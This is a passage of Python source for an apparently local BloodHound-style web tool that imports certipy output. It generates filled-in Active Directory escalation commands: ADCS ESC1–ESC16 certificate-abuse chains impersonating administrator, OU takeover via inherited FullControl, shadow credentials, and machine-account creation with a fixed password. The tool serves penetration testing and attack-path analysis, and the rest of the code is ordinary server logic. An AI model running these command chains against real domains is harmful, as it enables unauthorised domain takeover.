    setup_ous = {r["preludeKey"].split("||", 1)[1] for r in result if r["preludeKey"].split("||", 1)[1]}
    result = [
        r for r in result
        if not (r["targetType"] in CONTAINER_TYPES and dn_of.get(r["target"], "") in setup_ous)
    ]
    result.sort(key=lambda r: (RIGHT_RANK.get(key(r["right"]), 80), r["targetLabel"] or ""))
    return result


# ---------------------------------------------------------------------------
#  ADCS / certipy ingestion — turn `certipy find -json` into ESC edges so the
#  panel flags exactly which principal is vulnerable to which ESC, with the
#  full command chain (which template, which CA) already filled in. Because the
#  enrollable principal is usually a GROUP, group-delegation then propagates the
#  ESC to every member automatically.
# ---------------------------------------------------------------------------
# {ca}, {tpl}, {dom} are filled at import; <…> stays for the operator.
ESC_CHAINS = {
    "ESC1": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom}",
             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
    "ESC2": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
             "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>"],
    "ESC3": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template User -pfx <agent>.pfx -on-behalf-of '{dom}\\administrator'",
             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
    "ESC4": ["certipy template -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -template {tpl} -write-default-configuration -save-old",
             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom}",
             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
    "ESC6": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom}",
             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
    "ESC7": ["certipy ca -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -add-officer <user>",
             "certipy ca -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -enable-template SubCA",
             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template SubCA -upn administrator@{dom}   # note the request id",
             "certipy ca -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -issue-request <req-id>",
             "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -retrieve <req-id>"],
    "ESC8": ["certipy relay -target 'http://{ca}' -template DomainController",
             "certipy auth -pfx <dc>.pfx -dc-ip <dc-ip>"],
    "ESC9": ["certipy account -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{dom}",
             "certipy req -u '<victim>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
             "certipy account -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn <victim>@{dom}",
             "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
    "ESC13": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
              "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>"],
    "ESC15": ["certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl} -upn administrator@{dom} -application-policies 'Client Authentication'",
              "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
    "ESC16": ["certipy account -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> update -user <victim> -upn administrator@{dom}",
              "certipy req -u '<victim>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template User",
              "certipy auth -pfx administrator.pfx -dc-ip <dc-ip>"],
}


# Enrollment principals that are not an account you hold, but a group that ANY
# machine account joins automatically — so the enrollment right is reachable by
# creating one, provided ms-DS-MachineAccountQuota allows it.
MACHINE_BACKED_PRINCIPALS = {"DOMAIN COMPUTERS", "COMPUTERS"}
MACHINE_ACCOUNT = "OWNED$"
MACHINE_PASSWORD = "MachinePassword123!"


def machine_backed(principals):
    return any((pr or "").split("\\")[-1].strip().upper() in MACHINE_BACKED_PRINCIPALS
               for pr in (principals or []))


def esc_commands(esc, ca, tpl, dom, principals=None):
    chain = ESC_CHAINS.get(esc.upper()) or [
        "certipy req -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -ca {ca} -template {tpl}",
        "certipy auth -pfx <cert>.pfx -dc-ip <dc-ip>",
    ]
    cmds = [{"os": "linux", "tool": "certipy", "cmd": c.format(ca=ca, tpl=tpl, dom=dom)} for c in chain]
    if not machine_backed(principals):
        return cmds
    # Enrollment is granted to Domain Computers: you do not need to already control
    # a computer. Create one — it joins Domain Computers on creation — and enroll as
    # it. This only works while ms-DS-MachineAccountQuota > 0 (or you hold an
    # explicit right to create computer objects), so check that first.
    prelude = [
        {"os": "linux", "tool": "0 · can you create a machine account?",
         "cmd": "nxc ldap <dc-ip> -u '<user>' -p '<pass>' -M maq      # ms-DS-MachineAccountQuota > 0 ?"},
        {"os": "linux", "tool": "1 · create one (it joins Domain Computers automatically)",
         "cmd": "certipy account create -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -user '{acct}' -pass '{pw}'".format(
             dom=dom, acct=MACHINE_ACCOUNT, pw=MACHINE_PASSWORD)},
    ]
    out = list(prelude)
    for i, c in enumerate(cmds, start=len(prelude)):
        out.append({
            "os": c["os"],
            "tool": "{} · certipy".format(i),
            # enroll AS the machine account you just made
            "cmd": c["cmd"].replace("<user>", MACHINE_ACCOUNT).replace("<pass>", MACHINE_PASSWORD),
        })
    out.append({"os": "linux", "tool": "{} · clean up".format(len(out)),
                "cmd": "certipy account delete -u '<user>@{dom}' -p '<pass>' -dc-ip <dc-ip> -user '{acct}'".format(
                    dom=dom, acct=MACHINE_ACCOUNT)})
    return out


def ou_takeover(actor, ou_dn, domain, child_hint="<object-in-the-ou>"):
    """Descendant Object Takeover. Control of an OU only becomes control of the
    objects inside it once the ACE is written WITH inheritance — that flag is the
    whole attack, and shadow-credential commands aimed at the OU itself are
    meaningless."""
    dom = domain or ""
    return [
        {"os": "linux", "as": actor, "tool": "extend FullControl down the OU (-inheritance)",
         "cmd": "impacket-dacledit {}/'{}':'<pass>' -action write -rights FullControl -inheritance "
                "-principal '{}' -target-dn '{}' -dc-ip <dc-ip> -use-ldaps".format(dom, actor, actor, ou_dn)},
        {"os": "linux", "as": actor, "tool": "same step, bloodyAD",
         "cmd": "bloodyAD --host <dc> -d {} -u '{}' -p '<pass>' add genericAll '{}' '{}'".format(dom, actor, ou_dn, actor)},
        {"os": "linux", "as": actor, "tool": "then take any object it holds",
         "cmd": "certipy shadow auto -u '{}@{}' -p '<pass>' -account '{}' -dc-ip <dc-ip>   # adminCount=1 objects do NOT inherit".format(actor, dom, child_hint)},
        {"os": "windows", "as": actor, "tool": "PowerView",
         "cmd": "Add-DomainObjectAcl -TargetIdentity '{}' -PrincipalIdentity '{}' -Rights All".format(ou_dn, actor)},
    ]


def edge_abuse(row, src_label, domain, src_dn=""):
    """Commands for an edge: precomputed ADCS chain from its props if present,
    else the generic ABUSE map for the right."""
    p = props_of(row, "props")
    if p.get("cmds"):
        return p["cmds"]
    tprops = props_of(row, "target_props")
    tdn = node_dn(tprops)
    ttype = row["target_type"] if "target_type" in row.keys() else (row["ttype"] if "ttype" in row.keys() else "")
    if ttype in CONTAINER_TYPES and key(row["right_name"]) in CONTROL_RIGHTS and tdn:
        return ou_takeover(short_name(src_label), tdn, domain)
    return abuse_for(
        row["right_name"], src_label, principal_name(row["target_label"], tprops), domain,
        src_dn=src_dn, dst_dn=tdn,
    )


def _edge_esc(row):
    """Expose the ESC id/description on an ADCS edge (empty dict for normal edges)."""
    p = props_of(row, "props")
    return {"esc": p["esc"], "escDesc": p.get("desc", "")} if p.get("esc") else {}


def _certipy_domain(cas):
    for ca in cas.values():
        subj = ca.get("Certificate Subject") or ""
        parts = [seg.split("=", 1)[1] for seg in subj.split(",") if seg.strip().upper().startswith("DC=")]
        if parts:
            return ".".join(parts).lower()
    return None


def import_certipy(con, domain_id, data):
    cas = data.get("Certificate Authorities") or {}
    tpls = data.get("Certificate Templates") or {}
    dom_row = con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()
    dom = _certipy_domain(cas) or (dom_row["name"] if dom_row else "domain.local")
    # name → sid for resolving enrollable principals to existing graph nodes
    name2sid = {}
    for r in con.execute("SELECT sid,label,props FROM nodes WHERE domain_id=?", (domain_id,)):
        lbl = (r["label"] or "").upper()
        name2sid.setdefault(lbl, r["sid"])
        name2sid.setdefault(lbl.split("@")[0], r["sid"])
        try:
            sam = (json.loads(r["props"] or "{}") or {}).get("samaccountname")
            if sam:
                name2sid.setdefault(sam.upper(), r["sid"])
        except Exception:
            pass

    def upsert_node(sid, label, ntype, high, props):
        con.execute(
            "INSERT INTO nodes(domain_id,sid,label,type,high_value,owned,props) VALUES(?,?,?,?,?,0,?) "
            "ON CONFLICT(domain_id,sid) DO UPDATE SET label=excluded.label, type=excluded.type, high_value=excluded.high_value, props=excluded.props",
            (domain_id, sid, label, ntype, 1 if high else 0, json.dumps(props)),
        )

    findings = []  # everything the JSON flags, so the UI can show only these ESCs
    n_nodes = n_edges = n_tpls = 0
    for ca in cas.values():
        can = ca.get("CA Name") or "CA"
        upsert_node("ADCS-CA-%s" % can, can, "EnterpriseCA", True, {"dnsName": ca.get("DNS Name"), "subject": ca.get("Certificate Subject")})
        n_nodes += 1
        # CA-level ESCs (ESC6/7/8/11/16…) hang off the CA entry, not a template
        for esc, desc in (ca.get("[!] Vulnerabilities") or {}).items():
            findings.append({"esc": esc.upper(), "template": None, "ca": can, "principals": [], "desc": desc})
    for t in tpls.values():
        vulns = t.get("[!] Vulnerabilities") or {}
        if not vulns:
            continue
        tname = t.get("Template Name") or "Template"
        tsid = "ADCS-TPL-%s" % tname
        upsert_node(tsid, tname, "CertTemplate", True, {"escs": list(vulns.keys()), "cas": t.get("Certificate Authorities"), "enabled": t.get("Enabled")})
        n_nodes += 1
        n_tpls += 1
        ca_name = (t.get("Certificate Authorities") or ["<ca>"])[0]
        principals = set(t.get("[+] User Enrollable Principals") or [])
        perms = t.get("Permissions", {}) or {}
        ep = perms.get("Enrollment Permissions", {}) or {}
        principals |= set(ep.get("Enrollment Rights", []) or [])
        pretty = sorted({(pr or "").split("\\")[-1] for pr in principals if pr})
        for esc, desc in vulns.items():
            via_machine = machine_backed(principals)
            findings.append({
                "esc": esc.upper(), "template": tname, "ca": ca_name, "principals": pretty, "desc": desc,
                "viaMachineAccount": via_machine,
                "note": ("Enrollment is granted to Domain Computers — no existing computer needed: create a machine "
                         "account (requires ms-DS-MachineAccountQuota > 0) and enroll as it.") if via_machine else "",
            })
            props = json.dumps({
                "esc": esc, "desc": desc,
                "cmds": esc_commands(esc, ca_name, tname, dom, principals),
                "viaMachineAccount": via_machine,
            })
            for pr in principals:
                pname = (pr or "").split("\\")[-1].upper()
                psid = name2sid.get(pname)
                if not psid:
                    continue
                con.execute(
                    "INSERT INTO edges(domain_id,source_sid,target_sid,right_name,abusable,props) VALUES(?,?,?,?,1,?) "
                    "ON CONFLICT(domain_id,source_sid,target_sid,right_name) DO UPDATE SET abusable=1, props=excluded.props",
                    (domain_id, psid, tsid, "ADCS" + esc.upper(), props),
                )
                n_edges += 1
    con.execute("UPDATE domains SET node_count=(SELECT COUNT(*) FROM nodes WHERE domain_id=?), edge_count=(SELECT COUNT(*) FROM edges WHERE domain_id=?) WHERE id=?", (domain_id, domain_id, domain_id))
    con.commit()
    return {"templates": n_tpls, "nodes": n_nodes, "edges": n_edges, "findings": findings}


class Handler(BaseHTTPRequestHandler):
    server_version = "ADAutoGraph/" + __version__

    def log_message(self, fmt, *args):
        sys.stderr.write("[%s] %s\n" % (self.log_date_time_string(), fmt % args))

    def send_json(self, data, status=200):
        raw = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def send_file(self, path):
        if not path.exists() or not path.is_file():
            self.send_error(404)
            return
        ctype = "text/html"
        if path.suffix == ".js":
            ctype = "application/javascript"
        elif path.suffix == ".css":
            ctype = "text/css"
        raw = path.read_bytes()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        qs = urllib.parse.parse_qs(parsed.query)
        try:
            if path == "/":
                return self.send_file(WEB / "index.html")
            if path.startswith("/static/"):
                rel = posixpath.normpath(path[len("/static/") :])
                if rel.startswith("../"):
                    return self.send_error(403)
                return self.send_file(WEB / rel)
            if path == "/api/domains":
                con = db()
                rows = con.execute("SELECT * FROM domains ORDER BY created_at DESC").fetchall()
                con.close()
                # The UI has no other way to know what it is talking to, and an
                # issue report is worth a lot more with a version attached.
                return self.send_json({"domains": [dict(r) for r in rows], "version": __version__})
            if path.startswith("/api/domain/") and path.endswith("/graph"):
                domain_id = int(path.split("/")[3])
                view = qs.get("view", ["overview"])[0]
                query = qs.get("q", [""])[0]
                focus = qs.get("focus", [""])[0]
                rel = qs.get("rel", ["abusable"])[0]
                limit = min(2000, max(20, int(qs.get("limit", ["650"])[0])))
                return self.send_json(graph_payload(domain_id, view, query, focus, rel, limit))
            if path.startswith("/api/domain/") and path.endswith("/search"):
                domain_id = int(path.split("/")[3])
                return self.send_json({"nodes": search_nodes(domain_id, qs.get("q", [""])[0])})
            if path.startswith("/api/domain/") and path.endswith("/stats"):
                domain_id = int(path.split("/")[3])
                return self.send_json(domain_stats(domain_id))
            if path.startswith("/api/domain/") and "/node/" in path:
                parts = path.split("/")
                domain_id = int(parts[3])
                sid = urllib.parse.unquote(parts[5])
                detail = node_detail(domain_id, sid)
                return self.send_json(detail or {"error": "not found"}, 200 if detail else 404)
        except Exception as exc:
            return self.send_json({"error": str(exc)}, 500)
        self.send_error(404)

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        try:
            if path == "/api/import":
                form = multipart_form(self)
                fileitem = form.get("zip")
                if fileitem is None or not getattr(fileitem, "file", None):
                    return self.send_json({"error": "missing zip"}, 400)
                name_part = form.get("name")
                name = name_part.value if name_part else None
                # Optional: a list of already-compromised principals to pre-mark as
                # owned (names/SIDs, separated by newlines, commas or spaces).
                owned_part = form.get("owned")
                owned_raw = owned_part.value if owned_part else ""
                owned = [p for p in re.split(r"[\s,]+", owned_raw) if p]
                tmp = DATA / ("upload_%d.zip" % int(time.time() * 1000))
                with tmp.open("wb") as out:
                    while True:
                        chunk = fileitem.file.read(1024 * 1024)
                        if not chunk:
                            break
                        out.write(chunk)
                domain_id = import_zip(tmp, name, getattr(fileitem, "filename", None), owned)
                tmp.unlink(missing_ok=True)
                return self.send_json({"ok": True, "domainId": domain_id})
            if path.startswith("/api/domain/") and path.endswith("/adcs"):
                domain_id = int(path.split("/")[3])
                form = multipart_form(self)
                fileitem = form.get("json")
                if fileitem is None or not getattr(fileitem, "file", None):
                    return self.send_json({"error": "missing certipy json (field 'json')"}, 400)
                try:
                    data = json.loads(fileitem.file.read().decode("utf-8", "ignore"))
                except Exception as exc:
                    return self.send_json({"error": "not valid JSON: %s" % exc}, 400)
                con = db()
                if not con.execute("SELECT 1 FROM domains WHERE id=?", (domain_id,)).fetchone():
                    con.close()
                    return self.send_json({"error": "domain not found"}, 404)
                stats = import_certipy(con, domain_id, data)
                con.close()
                return self.send_json({"ok": True, **stats})
            if path.startswith("/api/domain/") and "/owned/" in path:
                parts = path.split("/")
                domain_id = int(parts[3])
                sid = urllib.parse.unquote(parts[5])
                con = db()
                row = con.execute("SELECT owned FROM nodes WHERE domain_id=? AND sid=?", (domain_id, sid)).fetchone()
                if not row:
                    con.close()
                    return self.send_json({"error": "not found"}, 404)
                owned = 0 if row["owned"] else 1
                with con:
                    con.execute("UPDATE nodes SET owned=? WHERE domain_id=? AND sid=?", (owned, domain_id, sid))
                con.close()
                return self.send_json({"ok": True, "owned": bool(owned)})
        except (ValueError, multipart.MultipartError) as exc:
            return self.send_json({"error": str(exc)}, 400)
        except Exception as exc:
            return self.send_json({"error": str(exc)}, 500)
        self.send_error(404)

    def do_DELETE(self):
        parsed = urllib.parse.urlparse(self.path)
        parts = parsed.path.split("/")
        try:
            # DELETE /api/domain/{id}  → drop the domain and cascade its nodes/edges
            if len(parts) == 4 and parts[1] == "api" and parts[2] == "domain" and parts[3].isdigit():
                domain_id = int(parts[3])
                con = db()  # db() sets PRAGMA foreign_keys=ON → ON DELETE CASCADE
                row = con.execute("SELECT name FROM domains WHERE id=?", (domain_id,)).fetchone()
                if not row:
                    con.close()
                    return self.send_json({"error": "not found"}, 404)
                with con:
                    con.execute("DELETE FROM domains WHERE id=?", (domain_id,))
                con.close()
                return self.send_json({"ok": True, "deleted": row["name"]})
        except Exception as exc:
            return self.send_json({"error": str(exc)}, 500)
        self.send_error(404)

MAX_UPLOAD_BYTES = 256 * 1024 * 1024  # 256 MiB
def multipart_form(
    handler: BaseHTTPRequestHandler,
) -> multipart.MultipartParser:
    content_type = handler.headers.get("Content-Type", "")
    kind, options = multipart.parse_options_header(content_type)
    boundary = options.get("boundary")

    if kind != "multipart/form-data" or not boundary:
        raise ValueError("expected multipart/form-data")

    try:
        content_lenght = int(handler.headers["Content-Length"])
    except (KeyError, ValueError) as err:
        raise ValueError("missing or invalid Content-Length") from err
    if content_lenght < 0 or content_lenght > MAX_UPLOAD_BYTES:
        raise ValueError("upload too large")

    return multipart.MultipartParser(
        stream=handler.rfile,
        boundary=boundary,
        content_length=content_lenght,
        strict=True,
        part_limit=8,
        partsize_limit=MAX_UPLOAD_BYTES,
        disk_limit=MAX_UPLOAD_BYTES,
    )

def main():
    parser = argparse.ArgumentParser(description="ADAutoGraph local BloodHound-style web UI")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8765)
    args = parser.parse_args()
    db().close()
    httpd = ThreadingHTTPServer((args.host, args.port), Handler)
    print(f"ADAutoGraph listening on http://{args.host}:{args.port}")
    httpd.serve_forever()


if __name__ == "__main__":
    main()
